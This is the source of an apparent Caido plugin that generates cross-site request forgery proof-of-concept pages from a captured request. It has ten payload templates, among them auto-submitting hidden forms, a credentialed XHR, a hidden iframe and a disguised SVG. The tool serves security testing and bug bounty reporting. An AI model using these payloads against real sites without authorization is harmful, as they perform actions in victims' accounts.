export async function init(sdk) {
  //Tur24Tur /BugBountyZip
  const style = document.createElement('style');
  style.textContent = `
    .csrf-modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(5, 6, 8, 0.68);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 24px;
    }

    .csrf-modal {
      width: min(1180px, calc(100vw - 48px));
      height: min(760px, calc(100vh - 48px));
      background: #1f2229;
      border: 1px solid #3a3d46;
      border-radius: 6px;
      color: #d7dbe3;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      box-shadow: 0 18px 48px rgba(0, 0, 0, 0.45);
    }

    .csrf-modal-header {
      flex: 0 0 48px;
      padding: 0 14px 0 16px;
      background: #242831;
      border-bottom: 1px solid #343841;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .csrf-modal-title {
      color: #f2f4f8;
      font-size: 15px;
      font-weight: 600;
      letter-spacing: 0;
    }

    .csrf-modal-close {
      width: 30px;
      height: 30px;
      background: transparent;
      border: 1px solid transparent;
      border-radius: 4px;
      color: #aeb4bf;
      cursor: pointer;
      font-size: 20px;
      line-height: 1;
    }

    .csrf-modal-close:hover {
      background: #2c313b;
      border-color: #3d4350;
      color: #f2f4f8;
    }

    .csrf-modal-body {
      flex: 1 1 auto;
      min-height: 0;
      display: grid;
      grid-template-columns: 260px minmax(0, 1fr);
      overflow: hidden;
    }

    .csrf-options {
      min-width: 0;
      background: #20242b;
      border-right: 1px solid #343841;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .csrf-section-label {
      color: #8f96a3;
      font-size: 11px;
      font-weight: 600;
      line-height: 1;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }

    .csrf-request-summary {
      color: #b8bec9;
      font-size: 12px;
      line-height: 1.4;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .csrf-techniques {
      display: flex;
      flex-direction: column;
      gap: 4px;
    }

    .csrf-technique {
      width: 100%;
      height: 30px;
      padding: 0 10px;
      background: transparent;
      border: 1px solid transparent;
      border-radius: 4px;
      color: #c5cad3;
      cursor: pointer;
      font-size: 13px;
      text-align: left;
    }

    .csrf-technique:hover {
      background: #2a2e36;
      color: #f2f4f8;
    }

    .csrf-technique.is-active {
      background: #303845;
      border-color: #4e5d70;
      color: #ffffff;
    }

    .csrf-checkbox-label {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #c5cad3;
      font-size: 13px;
      line-height: 1.4;
      padding-top: 10px;
      border-top: 1px solid #343841;
    }

    .csrf-checkbox-label input {
      width: 14px;
      height: 14px;
      accent-color: #4e83b8;
    }

    .csrf-output {
      min-width: 0;
      min-height: 0;
      background: #1f2229;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    .csrf-output-header {
      flex: 0 0 auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin-bottom: 10px;
    }

    .csrf-output-title {
      min-width: 0;
      color: #f2f4f8;
      font-size: 14px;
      font-weight: 600;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .csrf-button-group {
      flex: 0 0 auto;
      display: flex;
      gap: 8px;
    }

    .csrf-button {
      height: 32px;
      padding: 0 12px;
      border: 1px solid #424957;
      border-radius: 4px;
      background: #2a2f38;
      color: #e4e8ef;
      cursor: pointer;
      font-size: 13px;
      font-weight: 500;
    }

    .csrf-button:hover {
      background: #333946;
      border-color: #566174;
    }

    .csrf-button:active {
      background: #252a32;
    }

    .csrf-button-copy {
      background: #9f2849;
      border-color: #b33c5b;
      color: #ffffff;
    }

    .csrf-button-copy:hover {
      background: #b33254;
      border-color: #c94c6a;
    }

    .csrf-target-line {
      flex: 0 0 auto;
      margin-bottom: 10px;
      color: #9aa2af;
      font-size: 12px;
      line-height: 1.45;
      overflow-wrap: anywhere;
    }

    .csrf-code-editor {
      flex: 1 1 auto;
      min-height: 0;
      width: 100%;
      resize: none;
      background: #171a20;
      color: #f2f4f8;
      border: 1px solid #363c47;
      border-radius: 4px;
      padding: 12px;
      font-family: Consolas, Monaco, 'Courier New', monospace;
      font-size: 13px;
      line-height: 1.55;
      tab-size: 2;
      -moz-tab-size: 2;
      outline: none;
    }

    .csrf-code-editor:focus {
      border-color: #5b6b80;
    }

    .csrf-footer {
      flex: 0 0 34px;
      padding: 0 16px;
      background: #20242b;
      border-top: 1px solid #343841;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .csrf-footer-links {
      display: flex;
      gap: 14px;
    }

    .csrf-footer-link {
      color: #9da6b4;
      text-decoration: none;
      font-size: 12px;
    }

    .csrf-footer-link:hover {
      color: #f2f4f8;
    }

    .csrf-version {
      color: #7d8592;
      font-size: 12px;
    }

    @media (max-width: 760px) {
      .csrf-modal-overlay {
        padding: 12px;
      }

      .csrf-modal {
        width: calc(100vw - 24px);
        height: calc(100vh - 24px);
      }

      .csrf-modal-body {
        grid-template-columns: 1fr;
        grid-template-rows: auto minmax(0, 1fr);
      }

      .csrf-options {
        border-right: 0;
        border-bottom: 1px solid #343841;
      }

      .csrf-techniques {
        display: grid;
        grid-template-columns: repeat(2, minmax(0, 1fr));
      }
    }

    [data-tooltip] {
      position: relative;
    }

    [data-tooltip]:hover:after {
      content: attr(data-tooltip);
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%);
      padding: 4px 8px;
      background: rgba(0, 0, 0, 0.8);
      color: white;
      font-size: 12px;
      border-radius: 4px;
      white-space: nowrap;
      z-index: 10;
    }
  `;
  document.head.appendChild(style);

  // Ensure double quotes are encoded to ensure correct HTML generation and prevent accidental XSS
  const sanitizeValue = (value) => {
    return String(value).replace(/"/g, '&quot;');
  };

  const parseUrlEncodedParams = (data) => {
    return Array.from(new URLSearchParams(data).entries()).map(([name, value]) => ({
      name: sanitizeValue(name),
      value: sanitizeValue(value)
    }));
  };

  const parseQueryParams = (requestLine) => {
    const target = requestLine.match(/^\S+\s+(\S+)\s+HTTP/i)?.[1] ?? '';
    const queryStart = target.indexOf('?');
    if (queryStart === -1) {
      return [];
    }

    const fragmentStart = target.indexOf('#', queryStart);
    const query = target.slice(queryStart + 1, fragmentStart === -1 ? undefined : fragmentStart);
    return parseUrlEncodedParams(query);
  };

  const stripQueryString = (url) => {
    const queryStart = url.indexOf('?');
    return queryStart === -1 ? url : url.slice(0, queryStart);
  };

  const parseMultipartParams = (body, contentType) => {
    const boundary = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/i)?.[1] ?? contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/i)?.[2];
    if (!boundary) {
      return [];
    }

    return body
      .split(`--${boundary}`)
      .map(part => part.trim())
      .filter(part => part && part !== '--')
      .map(part => {
        const [headers, ...contentParts] = part.split(/\r?\n\r?\n/);
        const disposition = headers.match(/content-disposition:[^\r\n]+/i)?.[0] ?? '';
        const name = disposition.match(/name="([^"]+)"/i)?.[1];
        const isFile = /filename="/i.test(disposition);
        if (!name || isFile) {
          return undefined;
        }

        return {
          name: sanitizeValue(name),
          value: sanitizeValue(contentParts.join('\n\n').replace(/\r?\n--$/, '').trim())
        };
      })
      .filter(Boolean);
  };

  const parsePlainTextParams = (body) => {
    return body
      .split(/\r?\n|&/)
      .filter(param => param.includes('='))
      .map(param => {
        const [name, ...values] = param.split('=');
        return {
          name: sanitizeValue(name.trim()),
          value: sanitizeValue(values.join('=').trim())
        };
      });
  };
  
  const parseRequestParams = (request) => {
    try {
      const lines = request.split(/\r?\n/);
      const requestLine = lines[0] ?? '';
      let body = '';
      let contentType = '';
      let isBody = false;

      
      for (const line of lines) {
        if (line.toLowerCase().startsWith('content-type:')) {
          contentType = line.split(':')[1].trim();
        }
        if (!isBody && line.trim() === '') {
          isBody = true;
          continue;
        }
        if (isBody) {
          body += `${body ? '\n' : ''}${line}`;
        }
      }

      if (!body.trim()) {
        return parseQueryParams(requestLine);
      }

      if (contentType.includes('application/json')) {
        try {
          const jsonData = JSON.parse(body);
          return Object.entries(jsonData).map(([name, value]) => ({
            name: sanitizeValue(name),
            value: typeof value === 'object' ? sanitizeValue(JSON.stringify(value)) : sanitizeValue(String(value))
          }));
        } catch (e) {
          console.error('JSON parsing failed:', e);
          return [];
        }
      }

      if (contentType.includes('multipart/form-data')) {
        return parseMultipartParams(body, contentType);
      }

      if (contentType.includes('text/plain')) {
        return parsePlainTextParams(body);
      }

      return parseUrlEncodedParams(body);
      } catch (error) {
          console.error('Parameter parsing error:', error);
          return [];
        }
      };
  
   
    const generateStandardPoc = (method, url, params, autoSubmit) => {
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateUrlEncodedCsrf = (method, url, params, autoSubmit) => {
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>URL-encoded CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="application/x-www-form-urlencoded">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateMultipartCsrf = (method, url, params, autoSubmit) => {
      const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Multipart CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="multipart/form-data">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generatePlainTextCsrf = (method, url, params, autoSubmit) => {
      const rawBody = params.map(({name, value}) => `${name}=${value}`).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Plain Text CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="text/plain">
          <input type="hidden" name="${rawBody}" value="" />
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateSvgCsrf = (method, url, params, size = 200) => {
      const formFields = params.map(({name, value}) => 
        `<input type="hidden" name="${name}" value="${value}">`
      ).join('');
  
      return `<?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="${size}" height="${size}" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <rect width="${size}" height="${size}" fill="#f0f0f0"/>
      <circle cx="${size/2}" cy="${size/2}" r="${size/3}" fill="#ddd"/>
      <text x="${size/2}" y="${size/2}" text-anchor="middle" font-family="Arial" fill="#666">Loading...</text>
      
      <script type="text/javascript"><![CDATA[
          function submitCSRF() {
              var w = window.open('about:blank', '_blank');
              w.document.write(\`
                  <html>
                  <body>
                      <form method="${method.toLowerCase()}" action="${url}">
                          ${formFields}
                      </form>
                      <script>
                          document.forms[0].submit();
                      <\/script>
                  </body>
                  </html>
              \`);
              w.document.close();
          }
          submitCSRF();
      ]]></script>
  </svg>`;
    };
  
    const generateXhrCsrf = (method, url, params, autoSubmit) => {
      const paramString = params.map(({name, value}) => 
        `${encodeURIComponent(name)}=${encodeURIComponent(value)}`
      ).join('&');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>XHR CSRF PoC</h3>
      <script>
      function sendXHR() {
          var xhr = new XMLHttpRequest();
          xhr.open("${method.toLowerCase()}", "${url}", true);
          xhr.withCredentials = true;
          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          xhr.send("${paramString}");
      }
      ${autoSubmit ? 'sendXHR();' : ''}
      </script>
      <button onclick="sendXHR()">Send Request</button>
  </body>
  </html>`;
    };

const generateIframeCsrf = (method, url, params, autoSubmit) => {
  const formFields = params.map(({name, value}) => 
    `    <input type="hidden" name="${name}" value="${value}" />`
  ).join('\n');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>Iframe CSRF PoC</h3>
  <iframe id="csrf-frame" style="display:none"></iframe>
  <form id="csrf-form" target="csrf-frame" action="${url}" method="${method.toLowerCase()}">
${formFields}
  </form>
  <script>
      function submitForm() {
          document.getElementById('csrf-form').submit();
          setTimeout(() => {
              document.getElementById('csrf-frame').remove();
          }, 1000);
      }
      ${autoSubmit ? 'submitForm();' : ''}
  </script>
  <button onclick="submitForm()">Submit Request</button>
</body>
</html>`;
};

const generateMetaRefreshCsrf = (method, url, params) => {
  const formFields = params.map(({name, value}) => 
    `<input type="hidden" name="${name}" value="${value}">`
  ).join('');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
  <meta http-equiv="refresh" content="0; url=data:text/html;base64,${btoa(`
  <form method="${method.toLowerCase()}" action="${url}">
      ${formFields}
  </form>
  <script>document.forms[0].submit();</script>
  `)}">
</head>
<body>
  <h3>Meta Refresh CSRF PoC</h3>
  <p>If you are not redirected, <a href="#" onclick="document.forms[0].submit()">click here</a></p>
</body>
</html>`;
};

const generateWebSocketCsrf = (method, url, params) => {
  const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
  const payload = params.map(({name, value}) => `${name}=${value}`).join('&');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>WebSocket CSRF PoC</h3>
  <script>
      var ws = new WebSocket("${wsUrl}");
      ws.onopen = function() {
          ws.send("${payload}");
          setTimeout(() => ws.close(), 1000);
      };
  </script>
</body>
</html>`;
};

const generateDataUriCsrf = (method, url, params, autoSubmit) => {
  const formFields = params.map(({name, value}) => 
    `    <input type="hidden" name="${name}" value="${value}" />`
  ).join('\n');

  const html = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>Data URI CSRF PoC</h3>
  <form action="${url}" method="${method.toLowerCase()}">
${formFields}
  </form>
  ${autoSubmit ? '<script>document.forms[0].submit();</script>' : ''}
</body>
</html>`;

  return `<script>window.location='data:text/html;base64,${btoa(html)}';</script>`;
};

const techniques = [
  "Standard HTML Form",
  "URL-encoded form",
  "Multipart form",
  "Plain text form",
  "SVG-based CSRF",
  "XHR-based CSRF",
  "Iframe-based CSRF",
  "Meta Refresh CSRF",
  "WebSocket CSRF",
  "Data URI CSRF"
];

const generatePoc = (technique, method, url, params, autoSubmit) => {
  switch(technique) {
    case "URL-encoded form":
      return generateUrlEncodedCsrf(method, url, params, autoSubmit);
    case "Multipart form":
      return generateMultipartCsrf(method, url, params, autoSubmit);
    case "Plain text form":
      return generatePlainTextCsrf(method, url, params, autoSubmit);
    case "SVG-based CSRF":
      return generateSvgCsrf(method, url, params, 200);
    case "XHR-based CSRF":
      return generateXhrCsrf(method, url, params, autoSubmit);
    case "Iframe-based CSRF":
      return generateIframeCsrf(method, url, params, autoSubmit);
    case "Meta Refresh CSRF":
      return generateMetaRefreshCsrf(method, url, params);
    case "WebSocket CSRF":
      return generateWebSocketCsrf(method, url, params);
    case "Data URI CSRF":
      return generateDataUriCsrf(method, url, params, autoSubmit);
    default:
      return generateStandardPoc(method, url, params, autoSubmit);
  }
};

const addModalKeyboardHandling = (overlay) => {
  const handleKeydown = (e) => {
    if (e.key === 'Escape') {
      overlay.remove();
      document.removeEventListener('keydown', handleKeydown);
    }
  };
  document.addEventListener('keydown', handleKeydown);
};


const showCsrfModal = (request, url, method) => {
  const params = parseRequestParams(request);
  const targetUrl = method.toUpperCase() === 'GET' && params.length > 0 ? stripQueryString(url) : url;
  
  if (params.length === 0) {
    sdk.window.showToast('No parameters found in request', { variant: 'warning' });
  }
  
  const overlay = document.createElement('div');
  overlay.className = 'csrf-modal-overlay';
  
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) {
      overlay.remove();
    }
  });
  
  addModalKeyboardHandling(overlay);
  
  const modal = document.createElement('div');
  modal.className = 'csrf-modal';
  modal.addEventListener('click', (e) => e.stopPropagation());
  
  const header = document.createElement('div');
  header.className = 'csrf-modal-header';
  
  const title = document.createElement('div');
  title.className = 'csrf-modal-title';
  title.textContent = 'CSRF PoC Generator';
  
  const closeButton = document.createElement('button');
  closeButton.className = 'csrf-modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.onclick = () => overlay.remove();
  
  header.appendChild(title);
  header.appendChild(closeButton);
  
  const body = document.createElement('div');
  body.className = 'csrf-modal-body';
  
  const options = document.createElement('div');
  options.className = 'csrf-options';

  const requestSummary = document.createElement('div');
  requestSummary.className = 'csrf-request-summary';
  requestSummary.textContent = `${method.toUpperCase()} - ${params.length} parameter${params.length === 1 ? '' : 's'}`;

  const techniqueLabel = document.createElement('div');
  techniqueLabel.className = 'csrf-section-label';
  techniqueLabel.textContent = 'Payload';
  
  let selectedTechnique = techniques[0];
  const techniqueButtons = [];
  const techniqueList = document.createElement('div');
  techniqueList.className = 'csrf-techniques';

  const syncTechniqueButtons = () => {
    techniqueButtons.forEach(({ button, tech }) => {
      button.classList.toggle('is-active', tech === selectedTechnique);
    });
  };
  
  techniques.forEach(tech => {
    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'csrf-technique';
    button.textContent = tech;
    button.onclick = () => {
      selectedTechnique = tech;
      syncTechniqueButtons();
      const newOutput = updateOutput();
      currentOutput.replaceWith(newOutput);
      currentOutput = newOutput;
    };
    techniqueButtons.push({ button, tech });
    techniqueList.appendChild(button);
  });

  const checkboxLabel = document.createElement('label');
  checkboxLabel.className = 'csrf-checkbox-label';
  
  const checkbox = document.createElement('input');
  checkbox.type = 'checkbox';
  checkbox.checked = true;
  
  checkboxLabel.appendChild(checkbox);
  checkboxLabel.appendChild(document.createTextNode('Auto-submit when supported'));

  options.appendChild(requestSummary);
  options.appendChild(techniqueLabel);
  options.appendChild(techniqueList);
  options.appendChild(checkboxLabel);

  const updateOutput = () => {
    const poc = generatePoc(selectedTechnique, method, targetUrl, params, checkbox.checked);

    const output = document.createElement('div');
    output.className = 'csrf-output';
    
    const outputHeader = document.createElement('div');
    outputHeader.className = 'csrf-output-header';
    
    const outputTitle = document.createElement('div');
    outputTitle.className = 'csrf-output-title';
    outputTitle.textContent = selectedTechnique;
    
    const buttonGroup = document.createElement('div');
    buttonGroup.className = 'csrf-button-group';
    
    const copyButton = document.createElement('button');
    copyButton.className = 'csrf-button csrf-button-copy';
    copyButton.textContent = 'Copy';
    
    const downloadButton = document.createElement('button');
    downloadButton.className = 'csrf-button csrf-button-download';
    downloadButton.textContent = 'Download';
    
    const editor = document.createElement('textarea');
    editor.className = 'csrf-code-editor';
    editor.value = poc;
    editor.spellcheck = false;
    
    copyButton.onclick = async () => {
      await navigator.clipboard.writeText(editor.value);
      sdk.window.showToast('CSRF PoC copied to clipboard');
    };
    
    downloadButton.onclick = () => {
      const isSvg = selectedTechnique === "SVG-based CSRF";
      const blob = new Blob([editor.value], { 
        type: isSvg ? 'image/svg+xml' : 'text/html' 
      });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = isSvg ? 'csrf-poc.svg' : 'csrf-poc.html';
      a.click();
      URL.revokeObjectURL(a.href);
      sdk.window.showToast(`CSRF PoC downloaded as ${isSvg ? 'SVG' : 'HTML'}`);
    };
    
    buttonGroup.appendChild(copyButton);
    buttonGroup.appendChild(downloadButton);
    
    outputHeader.appendChild(outputTitle);
    outputHeader.appendChild(buttonGroup);
    
    const urlDisplay = document.createElement('div');
    urlDisplay.className = 'csrf-target-line';
    urlDisplay.textContent = `Target URL: ${targetUrl}`;
    
    output.appendChild(outputHeader);
    output.appendChild(urlDisplay);
    output.appendChild(editor);
    
    return output;
  };

  let currentOutput = updateOutput();
  syncTechniqueButtons();

  checkbox.addEventListener('change', () => {
    const newOutput = updateOutput();
    currentOutput.replaceWith(newOutput);
    currentOutput = newOutput;
  });

  const footerLinks = document.createElement('div');
  footerLinks.className = 'csrf-footer-links';

  const discordLink = document.createElement('a');
  discordLink.className = 'csrf-footer-link';
  discordLink.textContent = 'Discord';
  discordLink.href = '#';
  discordLink.addEventListener('click', (e) => {
    e.preventDefault();
    if (typeof __CAIDO_DESKTOP__ !== 'undefined' && __CAIDO_DESKTOP__.openInBrowser) {
      __CAIDO_DESKTOP__.openInBrowser('https://links.caido.io/www-discord');
    } else {
      window.open('https://links.caido.io/www-discord', '_blank', 'noopener,noreferrer');
    }
  });

  const contactLink = document.createElement('a');
  contactLink.className = 'csrf-footer-link';
  contactLink.textContent = 'Contact';
  contactLink.href = '#';
  contactLink.addEventListener('click', (e) => {
    e.preventDefault();
    if (typeof __CAIDO_DESKTOP__ !== 'undefined' && __CAIDO_DESKTOP__.openInBrowser) {
      __CAIDO_DESKTOP__.openInBrowser('https://x.com/Tur24Tur');
    } else {
      window.open('https://x.com/Tur24Tur', '_blank', 'noopener,noreferrer');
    }
  });

  const versionInfo = document.createElement('div');
  versionInfo.className = 'csrf-version';
  versionInfo.textContent = 'CSRF PoC Generator v1.0.5';

  footerLinks.appendChild(discordLink);
  footerLinks.appendChild(contactLink);

  const footer = document.createElement('div');
  footer.className = 'csrf-footer';
  footer.appendChild(footerLinks);
  footer.appendChild(versionInfo);

  body.appendChild(options);
  body.appendChild(currentOutput);
  modal.appendChild(header);
  modal.appendChild(body);
  modal.appendChild(footer);
  overlay.appendChild(modal);
  document.body.appendChild(overlay);
};

const getRequestFromContext = async (context) => {
  if (context.type === 'RequestContext') {
    return context.request;
  }

  if (context.type === 'RequestRowContext') {
    const selectedRequest = context.requests?.[0];
    if (!selectedRequest?.id) {
      return undefined;
    }

    const result = await sdk.graphql.request({ id: selectedRequest.id });
    return result.request;
  }

  return undefined;
};

const getFullUrl = (request, rawRequest, path) => {
  if (path.startsWith('http')) {
    return path;
  }

  const hostMatch = rawRequest.match(/Host:\s*([^\r\n]+)/i);
  let host = hostMatch ? hostMatch[1].trim() : request.host;

  if (!host && request.host) {
    host = request.host;
    const isDefaultPort = (request.isTls && request.port === 443) || (!request.isTls && request.port === 80);
    if (request.port && !isDefaultPort) {
      host = `${host}:${request.port}`;
    }
  }

  const scheme = request.isTls === false ? 'http' : 'https';
  return `${scheme}://${host}${path}`;
};

sdk.commands.register('generate-csrf-poc', {
  name: 'Generate CSRF PoC',
  run: async (context) => {
    try {
      const selectedRequest = await getRequestFromContext(context);
      const request = selectedRequest?.raw;
      if (!selectedRequest || !request) {
        sdk.window.showToast('No request selected', { variant: 'error' });
        return;
      }

      const firstLine = request.split(/\r?\n/)[0] ?? '';
      const method = selectedRequest.method ?? firstLine.split(/\s+/)[0];
      const urlMatch = firstLine.match(/^\S+\s+(\S+)\s+HTTP/i);
      const path = urlMatch ? urlMatch[1] : `${selectedRequest.path}${selectedRequest.query ? `?${selectedRequest.query}` : ''}`;
      const fullUrl = getFullUrl(selectedRequest, request, path);

      showCsrfModal(request, fullUrl, method);

    } catch (error) {
      sdk.window.showToast(`Error: ${error.message}`, { variant: 'error' });
      console.error(error);
    }
  }
});

sdk.menu.registerItem({
  type: 'Request',
  commandId: 'generate-csrf-poc',
});

sdk.menu.registerItem({
  type: 'RequestRow',
  commandId: 'generate-csrf-poc',
});
}
